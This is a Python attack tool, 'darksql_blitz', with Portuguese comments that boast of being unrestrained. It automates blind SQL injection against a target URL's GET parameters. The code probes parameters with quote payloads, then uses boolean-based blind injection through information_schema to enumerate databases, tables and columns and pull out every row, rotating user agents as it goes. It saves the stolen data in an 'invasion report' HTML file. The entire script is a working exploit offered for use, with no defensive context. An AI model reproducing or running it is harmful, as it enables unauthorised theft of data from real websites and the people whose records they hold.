#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# darksql_blitz.py
# Automação total de injeção SQL (libertária e sem freios)

import re
import sys
import time
import random
import string
import sqlite3
import hashlib
import argparse
import requests
import concurrent.futures
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import init, Fore, Style

init(autoreset=True)

BANNER = f"""
{Fore.RED}{Style.BRIGHT}
██████╗  █████╗ ██████╗ ██╗     ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔══██╗██╔══██╗██║     ██╔════╝██║  ██║██╔════╝██║     ██║     
██║  ██║███████║██████╔╝██║     █████╗  ███████║█████╗  ██║     ██║     
██║  ██║██╔══██║██╔═══╝ ██║     ██╔══╝  ██╔══██║██╔══╝  ██║     ██║     
██████╔╝██║  ██║██║     ███████╗███████╗██║  ██║███████╗███████╗███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
{Style.RESET_ALL}v1.0 – Automação total de SQLi | by DARKSQL-BLITZ
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
]

def random_agent():
    return random.choice(USER_AGENTS)

def log(msg, color=Fore.WHITE):
    print(f"{color}[*] {msg}")

def error(msg):
    print(f"{Fore.RED}[!] {msg}")

def success(msg):
    print(f"{Fore.GREEN}[+] {msg}")

def banner():
    print(BANNER)

# ---------- DETECÇÃO AUTOMÁTICA ----------
def find_injectable(url):
    log("Procurando ponto injetável...")
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        error("URL sem parâmetros GET.")
        return None, None
    payloads = ["'", '"', "')", '")', "'--", '"--']
    for param in params:
        for p in payloads:
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path, '',
                urlencode({k: v[0] + p if k == param else v[0] for k, v in params.items()}, doseq=True),
                ''
            ))
            try:
                r = requests.get(test_url, headers={'User-Agent': random_agent()}, timeout=10)
                if re.search(r"(?i)(sql syntax|mysql_fetch|ORA-|Microsoft OLE DB|SQLite error)", r.text):
                    success(f"Ponto injetável detectado no parâmetro: {param}")
                    return param, p[0]  # retorna aspas usada
            except requests.RequestException as e:
                error(str(e))
    error("Nenhum ponto injetável encontrado.")
    return None, None

# ---------- EXTRAÇÃO ----------
def blind_count(url, param, quote, query):
    for i in range(1, 1000):
        payload = f"{quote} and (select count(*) from ({query})x)={i}-- -"
        if check_boolean(url, param, payload):
            return i
    return 0

def blind_string(url, param, quote, query, pos):
    charset = string.ascii_letters + string.digits + "_$@!."
    for ch in charset:
        payload = f"{quote} and substr(({query}),{pos},1)='{ch}'-- -"
        if check_boolean(url, param, payload):
            return ch
    return ''

def check_boolean(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param][0] += payload
    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', urlencode(params, doseq=True), ''))
    try:
        r1 = requests.get(test_url, headers={'User-Agent': random_agent()}, timeout=10)
        params[param][0] = params[param][0].replace(payload, '')
        r2 = requests.get(urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', urlencode(params, doseq=True), '')), headers={'User-Agent': random_agent()}, timeout=10)
        return len(r1.text) != len(r2.text)
    except:
        return False

def extract_databases(url, param, quote):
    log("Enumerando bancos de dados...")
    dbs = []
    count = blind_count(url, param, quote, "select schema_name from information_schema.schemata")
    for i in range(count):
        name = ''
        for pos in range(1, 50):
            ch = blind_string(url, param, quote, f"select schema_name from information_schema.schemata limit {i},1", pos)
            if not ch:
                break
            name += ch
        if name:
            dbs.append(name)
    return dbs

def extract_tables(url, param, quote, db):
    log(f"Enumerando tabelas do banco {db}...")
    tables = []
    count = blind_count(url, param, quote, f"select table_name from information_schema.tables where table_schema='{db}'")
    for i in range(count):
        name = ''
        for pos in range(1, 50):
            ch = blind_string(url, param, quote, f"select table_name from information_schema.tables where table_schema='{db}' limit {i},1", pos)
            if not ch:
                break
            name += ch
        if name:
            tables.append(name)
    return tables

def extract_columns(url, param, quote, db, table):
    log(f"Enumerando colunas da tabela {db}.{table}...")
    cols = []
    count = blind_count(url, param, quote, f"select column_name from information_schema.columns where table_schema='{db}' and table_name='{table}'")
    for i in range(count):
        name = ''
        for pos in range(1, 50):
            ch = blind_string(url, param, quote, f"select column_name from information_schema.columns where table_schema='{db}' and table_name='{table}' limit {i},1", pos)
            if not ch:
                break
            name += ch
        if name:
            cols.append(name)
    return cols

def extract_data(url, param, quote, db, table, columns):
    log(f"Extraindo dados de {db}.{table}...")
    rows = []
    count = blind_count(url, param, quote, f"select * from {db}.{table}")
    for i in range(count):
        row = {}
        for col in columns:
            val = ''
            for pos in range(1, 200):
                ch = blind_string(url, param, quote, f"select {col} from {db}.{table} limit {i},1", pos)
                if not ch:
                    break
                val += ch
            row[col] = val
        rows.append(row)
    return rows

# ---------- RELATÓRIO HTML ----------
def generate_report(target, findings):
    html = f"""
<html>
<head><title>DARKSQL-BLITZ Report</title>
<style>
body{{font-family:Arial;background:#111;color:#0f0;margin:40px;}}
h1{{color:#f00;}}
table{{border-collapse:collapse;width:100%;}}
th,td{{border:1px solid #0f0;padding:8px;text-align:left;}}
</style>
</head>
<body>
<h1>DARKSQL-BLITZ – Relatório de Invasão SQL</h1>
<p><strong>Alvo:</strong> {target}</p>
<p><strong>Data:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
<h2>Dados extraídos</h2>
<table>
<tr><th>Database</th><th>Tabela</th><th>Coluna</th><th>Valor</th></tr>
"""
    for db, tables in findings.items():
        for tbl, rows in tables.items():
            for row in rows:
                for col, val in row.items():
                    html += f"<tr><td>{db}</td><td>{tbl}</td><td>{col}</td><td>{val}</td></tr>"
    html += "</table></body></html>"
    with open("report.html", "w", encoding="utf-8") as f:
        f.write(html)
    success("Relatório salvo em report.html")

# ---------- MODO AUTOMÁTICO ----------
def auto_mode(url):
    param, quote = find_injectable(url)
    if not param:
        return
    findings = {}
    dbs = extract_databases(url, param, quote)
    for db in dbs:
        findings[db] = {}
        tables = extract_tables(url, param, quote, db)
        for tbl in tables:
            cols = extract_columns(url, param, quote, db, tbl)
            rows = extract_data(url, param, quote, db, tbl, cols)
            findings[db][tbl] = rows
    generate_report(url, findings)

# ---------- MAIN ----------
def main():
    banner()
    parser = argparse.ArgumentParser(description="DARKSQL-BLITZ – Automação total de SQLi")
    parser.add_argument("-u", "--url", required=True, help="URL alvo com parâmetros GET")
    args = parser.parse_args()
    auto_mode(args.url)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        error("Interrompido pelo usuário.")